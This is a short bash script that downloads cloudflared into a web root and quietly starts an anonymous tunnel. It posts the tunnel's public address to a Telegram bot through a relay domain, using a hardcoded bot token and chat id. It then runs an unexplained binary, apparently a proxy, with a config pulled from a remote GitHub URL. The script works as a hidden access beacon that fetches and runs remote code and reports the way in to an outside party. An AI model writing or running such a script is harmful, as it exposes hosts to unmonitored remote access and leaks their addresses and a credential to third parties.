#!/bin/bash
cd /app/htdocs/
wget https://github.com/cloudflare/cloudflared/releases/download/2021.9.1/cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64
nohup ./cloudflared-linux-amd64 tunnel > connect.txt 2>&1 &
sleep 20
address=$(cat /app/htdocs/connect.txt | grep trycloudflare | grep https | awk '{print $4}')
curl -o /dev/null -s -X POST "https://scancf.5mao.cf/bot1661619958:AAFyFtChIIktzh8pc4sddagH7CYZ04c-GlA/sendMessage" -d "chat_id=1490165814&text=${address}"
./jbl -config=https://raw.githubusercontent.com/yxbt/v2/main/eu-de.json
